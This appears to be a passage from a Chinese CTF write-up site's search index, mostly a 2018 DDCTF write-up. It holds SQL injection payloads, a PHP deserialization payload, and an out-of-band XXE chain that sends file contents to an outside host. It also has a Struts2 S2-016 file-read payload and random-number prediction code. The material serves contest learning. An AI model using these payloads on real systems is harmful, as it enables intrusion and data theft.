{"./":{"url":"./","title":"介绍","keywords":"","body":"站点介绍 宗旨： 本站致力于收集各类CTF题的Writeup，以方便各位师傅们进行学习。 官方群 点我加群 :)群号: 937886410 感谢： 在此鸣谢对本站点提供帮助的朋友们(Issue、分享wp等)。以下排名不分前: ID 贡献 ID 贡献 Yunen 创始人 西瓜 提交WP 说明： 本站所有文章均来源于网上搜索查询和网友分享，如果您有更好的Writeup想分享，欢迎email我的邮箱(asp-php@foxmail.com)，如果损害了您的利益，请尽快联系我，确保在24小时之内进行删除。 "},"types/":{"url":"types/","title":"按类型区分","keywords":"","body":"按类型区分 按照赛题区分 类型 数量 网上练习题 1 官方赛事题 5 "},"types/web.html":{"url":"types/web.html","title":"网上练习题","keywords":"","body":"网上练习题 按照添加时间倒序排序 添加时间 名称 2019-04-15 实验吧web部分 "},"types/comp.html":{"url":"types/comp.html","title":"官方赛事题","keywords":"","body":"官方赛事题 按照添加时间倒序排序 添加时间 名称 2019-04-26 2018DDCTF滴滴夺旗赛 2019-04-18 2019全国大学生信息安全大赛 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-16 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 "},"years/":{"url":"years/","title":"按年份区分","keywords":"","body":"按年份区分 将WP按年份区分可让我们更好的去猜测出题人的命题思路。 时间 数量 2019-2020 3 2018-2019 1 2017-2018 1 2016-2017 0 2015-2016 0 ????-2015 1 "},"years/2020.html":{"url":"years/2020.html","title":"2019-2020","keywords":"","body":"2019-2020 2019-2020的CTF 添加时间 名称 2019-04-22 2019全国大学生信息安全大赛 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-15 2019西湖论剑预选赛 "},"years/2019.html":{"url":"years/2019.html","title":"2018-2019","keywords":"","body":"2018-2019 2018-2019年的CTF 添加时间 名称 2019-04-26 2018DDCTF "},"years/2018.html":{"url":"years/2018.html","title":"2017-2018","keywords":"","body":"2017-2018 2017-2018年的CTF 添加时间 名称 2019-04-16 2017全国大学生信息安全竞赛 "},"years/2017.html":{"url":"years/2017.html","title":"2016-2017","keywords":"","body":"2016-2017 2016-2017年的CTF 添加时间 名称 "},"years/2016.html":{"url":"years/2016.html","title":"2015-2016","keywords":"","body":"2015-2016 "},"years/2015.html":{"url":"years/2015.html","title":"????-2015","keywords":"","body":"????-2015 未知年份及2015年(包含)之前的CTF 添加时间 名称 2019-04-15 实验吧web部分 "},"difficult/":{"url":"difficult/","title":"按难度区分","keywords":"","body":"按难度区分 按照难度区分，更方便不同层次的师傅学习 难度 数量 较易 1 中等 5 较难 0 "},"difficult/easy.html":{"url":"difficult/easy.html","title":"相对简单","keywords":"","body":"相对简单 按照添加时间倒序排序 添加时间 名称 2019-04-15 实验吧web部分 "},"difficult/mid.html":{"url":"difficult/mid.html","title":"难度中等","keywords":"","body":"难度中等 按照添加时间倒序排序 添加时间 名称 2019-04-26 2018DDCTF滴滴夺旗赛 2019-04-22 2019全国大学生信息安全大赛 2019-04-18 2019DDCTF滴滴高校闯关赛 2019-04-15 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 "},"difficult/diff.html":{"url":"difficult/diff.html","title":"难度较大","keywords":"","body":"难度较大 "},"articals/all.html":{"url":"articals/all.html","title":"目前已收录","keywords":"","body":"目前已收录 时间按照新旧排序，欢迎提交好的Writeup 时间 名称 2019-04-26 2018DDCTF 2019-04-22 2019全国信安赛 2019-04-18 2019DDCTF 2019-04-16 2017全国信安赛 2019-04-15 2019西湖论剑预选赛 2019-04-15 实验吧web部分 "},"articals/2018ddctf.html":{"url":"articals/2018ddctf.html","title":"2018DDCTF","keywords":"","body":"﻿ 2018DDCTF滴滴高校闯关赛 题目类型： 类型 年份 难度 官方赛事题 2018 中 网上公开WP： https://impakho.com/post/ddctf-2018-writeup http://blog.5am3.com/2018/04/24/ddctf2018/ https://www.jianshu.com/p/e6b66c27bdfd https://www.anquanke.com/post/id/144879 http://www.leadroyal.cn/?p=466 https://www.anquanke.com/post/id/145553 题目下载: Android题目文件下载 ：https://github.com/LeadroyaL/attachment_repo/tree/master/didictf_2018 本站备份WP： 感谢作者：奈沙夜影、5am3、LeadroyaL、impakho WEB 感谢5am3师傅 ！ 数据库的秘密 [注意] 本次DDCTF所有WEB题无需使用也禁止使用扫描器 http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php 打开后会发现返回如下。 非法链接，只允许来自 123.232.23.245 的访问 此时可以通过修改HTTP请求头中的X-Forwarded-For即可。即添加以下字段 X-Forwarded-For:123.232.23.245 在这里，我用的是火狐的一个插件Modify Header Value (HTTP Headers)。 发现该网页是一个简单的查询列表。再加上题目中给的hint。可以判断为SQL注入题目。 经过测试，发现以上三个点均不是注入点。此时分析数据包，可以发现存在第四个注入点。 然后查看源码，发现一个隐藏字段。经过测试发现，该字段可以注入。 admin' && '1'='1'# admin' && '1'='2'# 尝试注入 author，可以发现以下内容信息 and （可以用&&代替） union select （很迷，这两个不能同时出现，然而自己又找不到其他方式） 仅允许#号注释 然后注入渣的自己就比较无奈了。。不会啊。只好祭出盲注大法了。经过尝试，最终构造以下payload可用。 admin' && binary substr((select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA),1,1) 然后开始写脚本，此时遇到了一个问题。发现他有一个验证。为了check你中途是否修改数据，而加入的一个hash比对。 首先将你的准备传送的内容进行某种hash后变为sig字段，然后再将sig通过get请求一起发送过去。此时服务器端会将sig与你发送的内容的hash比对一下。此时可以减少抓包中途修改内容的可能性。 所以，为了省事，我选择直接将这个代码调用一下。 用python的execjs库，可以直接执行js代码。 最终跑起脚本，获取到flag DDCTF{IKIDLHNZMKFUDEQE} 专属链接 题目： 现在，你拿到了滴滴平台为你同学生成的专属登录链接，但是你能进一步拿到专属他的秘密flag么 提示1：虽然原网站跟本次CTF没有关系，原网站是www.xiaojukeji.com 注：题目采用springmvc+mybatis编写，链接至其他域名的链接与本次CTF无关，请不要攻击 http://116.85.48.102:5050/welcom/3fca5965sd7b7s4a71s88c7se658165a791e 解答： 首先打开网站，发现是滴滴的官网。。 此时发现所有连接几乎全部重定向到了滴滴官网。 无奈下查看元素。发现hint 尝试访问，http://116.85.48.102:5050/flag/testflag/yourflag发现报错500，好像是数组越界？ 此时尝试将yourflag替换为DDCTF{1321}，返回failed!!!。 猜测爆破flag么？完全没戏啊。看样子应该有其他地方可以入手。 然而又发现了主页js的一句神奇的话。一个ajax语句。 然并卵，404。。。。。 此时只好继续分析题目，发现了令人眼前一亮的东西。对，就是下面这个icon。 http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= 访问后，发现下载了favicon.ico 此时发现图标好像图片很奇怪。后来果然验证了这是个hint。 此时可以愉快地玩耍了，这样一来，题目源码有了，还愁拿不下来么。 美滋滋。此时也知道了题目中hint的用意。题目采用springmvc+mybatis编写 百度搜索springmvc+mybatis文件结构，美滋滋读文件。 首先，大概知道了资源文件都是在WEB-INF文件夹下，所以猜测这个icon也在这里，此时我们要先确定文件夹。 WEB-INF下有一个web.xml，此时尝试读取，最终确定目录../../WEB-INF/web.xml。 然后拖文件。这里说几点注意事项。 通过../../WEB-INF/web.xml确认位置。 继续根据web.xml中的内容进行文件读取。classpath是WEB-INF/classes 读class文件时根据包名判断文件目录com.didichuxing.ctf.listener.InitListener 即为WEB-INF/com/didichuxing/ctf/listener/InitListener.class 制造网站报错，进一步找到更多的文件 差不多，注意一上四点，就可以拿到尽量多的源码了。 拖到源码后，就不美滋滋了。。。还好去年在DDCTF学过2017第二题的安卓逆向，会逆向了。 （此时坑点：jd-jui仅可逆jar，需要将class打成压缩包改为jar再逆向） 此时开始苦逼的分析源码。 分析后发现，存在接口，用当前用户的邮箱去生成一个flag。 但是flag是加密的。此时加密流程代码里都有，是一个RSA加密。密钥在服务器中的 此时又一次明白了，为什么读文件允许ks文件。 来吧，首先先拿邮箱申请一个flag 然而此时申请flag，邮箱也得先加密。自己提取出来的加密脚本如下。 public static String byte2hex(byte[] b) { StringBuilder hs = new StringBuilder(); for (int n = 0; (b != null) && (n 坑：但是此时后端仅允许post方式。且参数是以get传递的。 成功获取到flag Encrypted flag : 506920534F89FA62C1125AABE3462F49073AB9F5C2254895534600A9242B8F18D4E420419534118D8CF9C20D07825C4797AF1A169CA83F934EF508F617C300B04242BEEA14AA4BB0F4887494703F6F50E1873708A0FE4C87AC99153DD02EEF7F9906DE120F5895DA7AD134745E032F15D253F1E4DDD6E4BC67CD0CD2314BA32660AB873B3FF067D1F3FF219C21A8B5A67246D9AE5E9437DBDD4E7FAACBA748F58FC059F662D2554AB6377D581F03E4C85BBD8D67AC6626065E2C950B9E7FBE2AEA3071DC0904455375C66A2A3F8FF4691D0C4D76347083A1E596265080FEB30816C522C6BFEA41262240A71CDBA4C02DB4AFD46C7380E2A19B08231397D099FE 然后，解密吧。。 只能百度了，java又不熟，RSA更不熟，尤其还是这种hex的。逆源码都失败了。一个劲报错。（查百度，好像是因为啥空格之类的。打不过打不过） 最终发现一个好玩的，可以从keystore提取RSA私钥。这样一来，又继续美滋滋。 https://blog.csdn.net/zbuger/article/details/51690900 然后照猫画虎，提出私钥。此时祭出自己的一个无敌大件。之前从某次CTF安卓题提出的RSA解密脚本。（当时题目简单，加解密都给了，改个函数名就ok了。） (╯°□°）╯︵ ┻━┻ 要不是在线的解不了。才不会想起这个大招（已放到附件，记得将 密文to ascii 再 to base64。）。。。。。 通过在线工具，提取出公私钥，然后跑脚本。最终拿到flag。 DDCTF{1797193649441981961} 注入的奥妙 题目： 本题flag不需要包含DDCTF{}，为[0-9a-f]+ http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/well/getmessage/1 解答： 按照题目要求，这题应该是个注入题，毫无疑问。 查看源码，发现给了big5的编码表，此时猜测可以通过宽字节进行注入。 1餐' and 1=1%23 orderby，发现有三个字段，尝试构造联合查询语句，发现union会被直接删除。此时双写绕过即可。 此时查询数据库： 1餐' uniunionon select SCHEMA_NAME,2,3 from information_schema.SCHEMATA %23 然后继续查询表名： 1餐' uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=sqli %23 此时发生了一件尴尬的事情。我们无法继续构造单双引号，这样数据库会报以下错误。 此时祭出hex大法。数据库会直接将0x开头的进行转码解析。 1餐' uniunionon select TABLE_NAME,2,3 from information_schema.tables where table_schema=0x73716c69 %23 此时成功的爆出来了三个表 message,route_rules,users 然后就没啥好说的了。挨个查着玩就可以了，基本同上。然后查字段啥的。 查路由的时候，有点小坑，不知道后端怎么解析的，会将一列数据解析到多列，此时用mysql的to_base64()函数即可。 通过路由信息，我们可以发现存在static/bootstrap/css/backup.css源码泄露。 通过以下三行脚本即可保存该文件。 import requests f=open('a.zip','wb') f.write(requests.get('http://116.85.48.105:5033/static/bootstrap/css/backup.css').content) 接下来就是对PHP代码的审计。 首先，分析路由。我们从数据表内知道了有以下几条规则 get/:u/well/getmessage/:s Well#getmessage get/:u/justtry/self/:s JustTry#self post*/:u/justtry/try JustTry#try 首先第一条，就是咱刚刚实现注入的那一个。不用多看，逻辑差不多清楚。 第二，三条，调用的都是justtry类下的某个方法。所以可以跟进去，重点分析下这个函数。 此时看见了 unserialize ，倍感亲切，这不就是反序列化么。 此时就需要考虑反序列化了。他后面限制了几个类，此时我们可以一一打开分析。 test类，顾名思义，就是一个测试用的。 此时我们发现他的析构函数中，有一条特殊的句子。跟进去之后发现，他会将falg打印出来。 仔细分析源码后发现，这个test类通过调用Flag类来获取flag，然而Flag类又需要调用SQL类来进行数据库查询。 所以，这个反序列化是个相当大的工程。自己手写是无望了。 首先尝试了一下，自己写三个类的调用。。。然而失败了。 最后复现源码，并在try方法打印序列化对象后。（uuid是你的url那串，uuid类下正则可以看出来。） 发现，他是有一个命名空间的要求。序列化后语句如下 O:17:\"Index\\Helper\\Test\":2:{s:9:\"user_uuid\";s:36:\"4eaee5db-2304-4d6d-aa9c-962051d99a41\";s:2:\"fl\";O:17:\"Index\\Helper\\Flag\":1:{s:3:\"sql\";O:16:\"Index\\Helper\\SQL\":2:{s:3:\"dbc\";N;s:3:\"pdo\";N;}}} 最终的Payload如下： url:http://116.85.48.105:5033/4eaee5db-2304-4d6d-aa9c-962051d99a41/justtry/try/ postdata: serialize=%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%54%65%73%74%22%3a%32%3a%7b%73%3a%39%3a%22%75%73%65%72%5f%75%75%69%64%22%3b%73%3a%33%36%3a%22%34%65%61%65%65%35%64%62%2d%32%33%30%34%2d%34%64%36%64%2d%61%61%39%63%2d%39%36%32%30%35%31%64%39%39%61%34%31%22%3b%73%3a%32%3a%22%66%6c%22%3b%4f%3a%31%37%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%46%6c%61%67%22%3a%31%3a%7b%73%3a%33%3a%22%73%71%6c%22%3b%4f%3a%31%36%3a%22%49%6e%64%65%78%5c%48%65%6c%70%65%72%5c%53%51%4c%22%3a%32%3a%7b%73%3a%33%3a%22%64%62%63%22%3b%4e%3b%73%3a%33%3a%22%70%64%6f%22%3b%4e%3b%7d%7d%7d mini blockchain 题目 ： 某银行利用区块链技术，发明了DiDiCoins记账系统。某宝石商店采用了这一方式来完成钻石的销售与清算过程。不幸的是，该银行被黑客入侵，私钥被窃取，维持区块链正常运转的矿机也全部宕机。现在，你能追回所有DDCoins，并且从商店购买2颗钻石么？ 注意事项：区块链是存在cookie里的，可能会因为区块链太长，浏览器不接受服务器返回的set-cookie字段而导致区块链无法更新，因此强烈推荐写脚本发请求 题目入口： http://116.85.48.107:5000/b942f830cf97e 解答 ： 拿到题目，内心是拒绝的。因为虽然说区块链这么火，但是自己还是没怎么了解过。 第一反应是。药丸，没戏了。但是，搞信息安全的孩子怎么可以轻言放弃呢！ 时间辣么长，还不信看不明白个区块链。最后肛了两天多，才大概明白了题目 首先，题目给了源码，这个很棒棒。 建议大家分析题目时将代码也多读几遍，然后再结合参考资料进行理解。 在这里不做太多的理解源码的讲解。 最初我是将重心代码的一些逻辑上，以及加密是否可逆。（发现自己太年轻，看不懂） 然后慢慢的开始了解区块链，最后发现这种手段。 这道题目中，利用了区块链一个很神奇的东西。 因为区块链是一个链表，而且还是一个谁都可以增加的，此时，人们达成了一种默认，以最长的那条链为主链（正版），其他的分支都是盗版。 如下图，就是此时该题目的区块链。 那么我们可以再构造一条链，只要比主链长，那这条链就是我们说了算。 此时虽然说区块链1是正规的链，但是区块链2要比1长，此时区块链2即为正规链。 但是，说的轻巧，我们该如何构造呢？ 首先，我们分析路由可以发现，题目预留了一个创建交易的接口。此时可以生成新块。 只要我们可以挖到一个DDcoin，就可以创建一次新块，然后会判断商店的余额。最终给予砖石奖励。 然而DDcoin是什么呢。 在这道题里，其实就是这个东西，这就是一个区块。对他进行分析一下。 nonce:自定义字符串 prev：上一个区块的地址 hash：这个区块的hash height：当前处于第几个节点 transactions：交易信息 再分析transactions input与signature好像是一个凭证，验证这个区块主人身份。 output，收款人信息 amount，收款数额 addr，收款地址 hash这里的话，不是太明白。 但是看代码。发现都有现成的可以生成。只要利用这三个函数，即可创建一个新的区块。 create_output_utxo(addr_to, amount) // 新建一个output信息 create_tx(input_utxo_ids, output_utxo, privkey_from=None) // 新建一个transactions信息 create_block(prev_block_hash, nonce_str, transactions) // 新建一个区块 首先新建output，此时参数很简单，收货人地址（商店），数量（全款） 然后创建tx，此时output_utxo就是刚刚咱创建好的那个。然而问题来了，私钥和id咱是没有的。此时分析代码可以发现，这一步做的主要就是创建一个sig签名。还有就是生成一个hash 此时，邪恶的想到，既然是要创建第二条链，那么可不可以借用一下第一条链的第一块的信息。 也就是直接忽略掉sig的生成，伪造tx，直接重写一下create_tx 然后此时tx也有了，进行下一步create_block 此时他的三个参数也好写，上一个区块的hash，自定义字符串，刚刚做好的tx 此时，我们要通过爆破nonce的方式，来使create_block生成的块的hash为00000开头， 这样，我们才能添加。 然后向那个添加块的地址post由create_block即可成功添加第一个块。 记得改请求头中的content-type为json。还有就是cookie自己手动更新 第二个块的时候，问题又来了。 这条链中，我们之前的tx已经使用过一次，无法使用了。怎么办？ 此时可以注意到题目中init中给的hint。 凭啥他可以不写tx就生成块！不开心，你都能那样，我也要！ 于是。。。。。通过这个方式，在后面添加几个空区块就好。 成功伪造主链！获取一颗砖石。 再次重复以上做法，完成第三条链即可获取到flag 切记，手动更新cookie…… 我的博客 题目 ： 提示：www.tar.gz http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d 解答 ： 题目又给了源码，美滋滋。 然而下载到源码后就不美滋滋了。 一共给了三个页面，主页很明显，有一个SQL注入漏洞。这个题之前安恒杯三月见过。利用率printf函数的一个小漏洞，%1$’可以造成单引号逃逸。 然而，你是进不去主页的。因为。。 还没进去，就被die了。 然后只好分析如何能成为admin了。此时看到了。 当你是通过邀请码注册的，你便可以成为admin。 然而，邀请码是完全随机的。 此时，想起LCTF的一道题，感觉完全一样有木有！ https://github.com/LCTF/LCTF2017/tree/master/src/web/%E8%90%8C%E8%90%8C%E5%93%92%E7%9A%84%E6%8A%A5%E5%90%8D%E7%B3%BB%E7%BB%9F 然而当时有两个解，一个非预期条件竞争，另一个正则的漏洞。 此时这题完全没用啊！当时要疯了，猜测，难道是要预测随机数？ 然而，当我看到大佬这句话的时候，萌生了放弃的想法，猜测肯定还有其他解法。 奈何，看啊看，看啊看，我瞪电脑，电脑瞪我。 最后还是决定看一下随机数这里。很开心，找到了这篇文章。 http://drops.xmd5.com/static/drops/web-11861.html 然而，每个卵用，他只告诉了我：对！毛病就在随机数，但是你会么？ 满满的都是嘲讽…. 来吧，一起看，首先这篇文章讲了一种后门的隐藏方式，话说我读了好几遍才理解。 然后不得不感叹，作者….你还是人么。这都能想出来。服！真的服！ 首先，大家需要先知道rand()是不安全的随机数。（然而我不知道） 然后str_shuffle()是调用rand()实现的随机。所以此时重点是。如何预测rand？ 然而作者没告诉，给的链接都是数学，看不懂….. 此时PHITHON大佬的这篇文章真的是解救了自己。 https://www.leavesongs.com/penetration/safeboxs-secret.html 所以，此时我们知道了一件事情。当我们可以获取到连续的33个随机数后，我们就可以预测后面连续的所有随机数。 如何连续？大佬文章中说了，通过http请求头中的Connection:Keep-Alive。 此时，我们先获取他100个随机数。 s = requests.Session() url='http://116.85.39.110:5032/a8e794800ac5c088a73b6b9b38b38c8d/register.php' headers={'Connection': 'Keep-Alive'} state=[] for i in range(50): r=s.get(url,headers=headers) state.append(int(re.search(r'id=\"csrf\" value=\"(.+?)\" required>', r.text, re.M|re.I).group(1))) 然后测试一下 yuce_list=[] for i in range(10): yuceTemp=yuce(len(state)) state.append(yuceTemp) yuce_list.append(yuceTemp) 此时发现和实际是有一些冲突的。分析后发现，应该将生成的随机数取余2147483647才是真正的数。 但此时又有了一个问题。 之前大佬是说过会有一定的误差，但是误差率太高了。虽然误差不大，但是…. 此时，没办法，只能祈求后面会处理误差。此时我们完成了随机数的预测。 接下来需要写如何打乱字符串。 可以发现，一个很简单的流程，生成随机数，然后交换位置。 唯一不知道的地方就是其中这个地方的一个函数。 此时直接去GitHub翻一下源码。 https://github.com/jinjiajin/php-5.6.9/blob/35e92f1f88b176d64f1d8fc983e466df383ee34e/ext/standard/php_rand.h 然后就是愉快的重写代码。 def rand_range(rand,minN,maxN,tmax=2147483647): temp1=tmax+1.0 temp2=rand/temp1 temp3=maxN-minN temp4=temp3+1.0 temp5=temp4*temp2 rand=minN+(int)(temp5) return rand admin_old=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'] for i in range(len(admin_old))[::-1]: a=rand_range(int(yuce_list[len(admin_old)-i-1]),0,i) admin_old[i],admin_old[a]=admin_old[a],admin_old[i] key='' for i in admin_old: key+=i print(key) 此时就可以愉快的生成随机数了。然后在进行一下注册。此时csrf记得提前在获取state时保存一下最后一位。 def getAdmin(username,passwd,code): data={ \"csrf\":csrf, \"username\":username, \"password\":passwd, \"code\":code } r=s.post(url,headers=headers,data=data) print(r.text) 切记！code是：admin###开头，后面截取32位！ 最后用拿到的账号进行登录即可。 后面就是sql注入了。很简单，只要单引号逃逸后，就可以显注了。没有其他过滤 /a8e794800ac5c088a73b6b9b38b38c8d/index.php?id=1&title=-1%1$'+union+select+1,f14g,3+from+a8e79480.key+where+1+%23 喝杯Java冷静下 题目： 题目环境：Quick4j 解答： 查看网页源代码，找到登录的用户名和密码（admin: admin_password_2333_caicaikan） Line 87: 登录进去发现跟 Web2 差不多，也是 任意文件下载漏洞。 对比 Github 上 Quick4j 的源代码文件路径，把所有代码文件对应的下载下来，与原来的代码进行比较。 找到关键文件，进行反编译： /rest/user/getInfomation?filename=WEB-INF/classes/com/eliteams/quick4j/web/security/SecurityRealm.class if ((username.equals(\"superadmin_hahaha_2333\")) && (password.hashCode() == 0)) { String wonderful = \"you are wonderful,boy~\"; System.err.println(wonderful); } 找到超级管理员用户名和密码（superadmin_hahaha_2333: f5a5a608） /rest/user/getInfomation?filename=WEB-INF/classes/com/eliteams/quick4j/web/controller/UserController.class @RequestMapping(value={\"/nicaicaikan_url_23333_secret\"}, produces={\"text/html;charset=UTF-8\"}) @ResponseBody @RequiresRoles({\"super_admin\"}) 这里以超级管理员身份，可以实现 XML 外部实体注入 漏洞。 但是这里的注入没有回显，那只能用反弹实现回显了。 服务器部署 1.xml： \"> 服务器监听端口：nc -l -p 23946 Payload 示例： %dtd; %all; ]> &send; 读取 /Flag/hint.txt 文件： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22file%3a%2f%2f%2fflag%2fhint.txt%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e Flag in intranet tomcat_2 server 8080 port. 访问 http://tomcat_2:8080/ ： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2f%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e try to visit hello.action. 访问 http://tomcat_2:8080/hello.action ： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2fhello.action%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e This is Struts2 Demo APP, try to read /flag/flag.txt. 根据题目提示：第二层关卡应用版本号为 2.3.1 上网查了一下 Struts2 2.3.1 的 CVE ，发现 Struts2 S2-016 可用 直接贴上最终 Payload： /rest/user/nicaicaikan_url_23333_secret?xmlData=%3c%3fxml+version%3d%221.0%22+encoding%3d%22utf-8%22%3f%3e%3c!DOCTYPE+data+%5b%3c!ENTITY+%25+file+SYSTEM+%22http%3a%2f%2ftomcat_2%3a8080%2fhello.action%3fredirect%253a%2524%257b%2523a%253dnew%2bjava.io.FileInputStream(%2527%252fflag%252fflag.txt%2527)%252c%2523b%253dnew%2bjava.io.InputStreamReader(%2523a)%252c%2523c%253dnew%2bjava.io.BufferedReader(%2523b)%252c%2523d%253dnew%2bchar%255b60%255d%252c%2523c.read(%2523d)%252c%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527).getWriter()%252c%2523matt.println(%2523d)%252c%2523matt.flush()%252c%2523matt.close()%257d%22%3e%3c!ENTITY+%25+dtd+SYSTEM+%22http%3a%2f%2f222.125.86.10%2f1.xml%22%3e%25dtd%3b+%25all%3b%5d%3e%3cvalue%3e%26send%3b%3c%2fvalue%3e Flag: DDCTF{You_Got_it_WonDe2fUl_Man_ha2333_CQjXiolS2jqUbYIbtrOb} MISC 作者：5am3、impakho 签到题 题目 ： 请点击按钮下载附件 解答 ： 出题人是真的皮。下载后会发现一个神奇的东西。flag.txt里面的内容是这个 请查看赛题上方“公告”页 然后打开公告页，发现了他。。 DDCTF{echo”W3Lc0me_2_DiD1${PAAMAYIM_NEKUDOTAYIM}C7f!”} 好歹咱也是个web手。so ….. 本来还以为要解开里面的PHP代码。自己误以为是这个。 DDCTF{W3Lc0me_2_DiD1::C7f!\"} 最后发现，原来是真·签到题。 (╯°□°）╯︵ ┻━┻ 题目 ： (╯°□°）╯︵ ┻━┻ d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd 解答 ： 这道题蛮坑的。。想了无数种密码后都没思路。最后只能老老实实研究，或许是一些简单的编码？ 一共134个字符。尝试2位一组，转化为十进制后，发现数值在一定范围内浮动。 然后考虑到ascii码可见区域，于是尝试对其进行取余128的操作。 最后发现余数均在ascii码的可见区域。之后hex2ascii 即可获取到flag。 a=[212,232,225,244,160,247,225,243,160,230,225,243,244,161,160,212,232,229,160,230,236,225,231,160,233,243,186,160,196,196,195,212,198,251,185,178,178,225,226,185,185,183,180,225,180,183,227,228,179,178,178,227,230,180,179,226,181,176,182,177,176,230,225,229,225,181,253] b='' for i in a: b+=chr(i%128) print(b) DDCTF{922ab9974a47cd322cf43b50610faea5} 第四扩展FS D公司正在调查一起内部数据泄露事件，锁定嫌疑人小明，取证人员从小明手机中获取了一张图片引起了怀疑。这是一道送分题，提示已经在题目里，日常违规审计中频次有时候非常重要。 拿到图片，发现大小出奇的大，于是尝试binwalk，提出来一个压缩包。 尝试打开，发现是有密码的。（这里有个技巧，个人比较喜欢用windows的好压解压缩软件，这个软件存在一定的压缩包修复。） 然后回到题目，仔细分析。尝试无果后，最终将密码锁定在了提示已经在题目里，所以尝试查看文件属性，发现了一些奇怪的字符串。 一般来说，图片信息中不会出现备注的。所以尝试将其作为密码解压，解压成功。 然后发现了一串稀奇古怪的。。。。字符。 此时想到了题目中给的hint：日常违规审计中频次有时候非常重要 尝试词频统计。得到flag 此时有一点小小坑。。D是两个。。 flag ：DDCTF{x1n9shaNgbIci} 流量分析 题目 ： 提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c 提示二：注意补齐私钥格式 —–BEGIN RSA PRIVATE KEY—– XXXXXXX —–END RSA PRIVATE KEY—– 解答 ： 怎么说呢，做完这题，我才知道坑人能有多坑！ 流量分析的题，首先可以发现他的大小很小。不像是那种大流量的分析。 尝试了一下学长之前推荐的一款工具《科来网络分析系统》 可以发现ftp传输了两个包。此时，fl-g极有可能是flag。 于是拿wireshark千辛万苦，提取出来压缩包。然而….没有密码。 只好继续分析了。因为毕竟misc4了，不可能是密码爆破啥的吧。 继续看， 发现一个邮件（不知道科来怎么提文件，查看数据。哭唧唧） wireshark导出IMF对象。可以发现导出了几个邮件。然后逐个分析。 然而并没卵用，唯一有点用的，感觉奇怪的，就只有一个邮件。 此时这个不是一点的奇怪！而是很奇怪！那么，这串密钥。。是干什么的呢。 经过老司机多年开车经验，呸。做题经验。 猜测！肯定有https流量。当然，科来也说有了。 于是。。这种之前曾听说过的题目，现在到了手里还是有些小激动的。 尤其是那个图片！图片！图片！！！！ ocr也不行，手写也不行。那么多字。心塞ing。 好吧，最后还是百度找了个ocr识别了一下，然后改了几个字符。。 然后就是解密https流量。具体可以看这个链接。 https://blog.csdn.net/kelsel/article/details/52758192 直接导入私钥就可以。这里需要按照hint格式来，在前后加上标志位。 然后就可以解密https流量了。 然后搜索ssl，追踪http流量，最后取得flag 安全通信 感谢impakho师傅！ 题目： #!/usr/bin/env python import sys import json from Crypto.Cipher import AES from Crypto import Random def get_padding(rawstr): remainder = len(rawstr) % 16 if remainder != 0: return '\\x00' * (16 - remainder) return '' def aes_encrypt(key, plaintext): plaintext += get_padding(plaintext) aes = AES.new(key, AES.MODE_ECB) cipher_text = aes.encrypt(plaintext).encode('hex') return cipher_text def generate_hello(key, name, flag): message = \"Connection for mission: {}, your mission's flag is: {}\".format(name, flag) return aes_encrypt(key, message) def get_input(): return raw_input() def print_output(message): print(message) sys.stdout.flush() def handle(): print_output(\"Please enter mission key:\") mission_key = get_input().rstrip() print_output(\"Please enter your Agent ID to secure communications:\") agentid = get_input().rstrip() rnd = Random.new() session_key = rnd.read(16) flag = '' print_output(generate_hello(session_key, agentid, flag)) while True: print_output(\"Please send some messages to be encrypted, 'quit' to exit:\") msg = get_input().rstrip() if msg == 'quit': print_output(\"Bye!\") break enc = aes_encrypt(session_key, msg) print_output(enc) if __name__ == \"__main__\": handle() 解答 ： 从 get_padding 和 aes_encrypt 能够看出这是一个 AES ECB 256位分组加密加密密钥是 16字节 随机生成，ECB明文分组相同，对应的密文分组也相同。 由此可以通过改变 agentid 的长度，使flag中的字符依次落入前面已知的明文分组中，逐字节爆破。 贴出脚本： from pwn import * import string LOG = False flag = '' mission_key = '********************************' agent_id = '' while True: r = remote('116.85.48.103', 5002) 